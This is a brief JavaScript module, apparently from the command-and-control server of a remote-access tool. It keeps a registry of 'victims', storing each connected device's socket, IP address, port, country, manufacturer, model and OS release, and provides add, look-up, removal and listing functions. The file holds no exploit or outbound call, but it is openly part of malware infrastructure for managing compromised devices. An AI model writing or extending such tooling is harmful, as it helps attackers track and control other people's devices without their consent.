 var Victim = function(socket, ip, port, country, manf, model, release, clientId) {
     this.socket = socket;
     this.ip = ip;
     this.port = port;
     this.country = country;
     this.manf = manf;
     this.model = model;
     this.release = release;
     this.clientId = clientId
 };

 class Victims {
     constructor() {
         this.victimList = {};
         this.instance = this;
     }

     addVictim = (socket, ip, port, country, manf, model, release, id, clientId) => {
        var victim = new Victim(socket, ip, port, country, manf, model, release, clientId);
        this.victimList[id] = victim;
    }
    

     getVictim(id) {
         if (this.victimList[id] != null)
             return this.victimList[id];

         return -1;
     }

     rmVictim(id) {
         delete this.victimList[id];
     }

     getVictimList() {
         return this.victimList;
     }
 }

 module.exports = new Victims();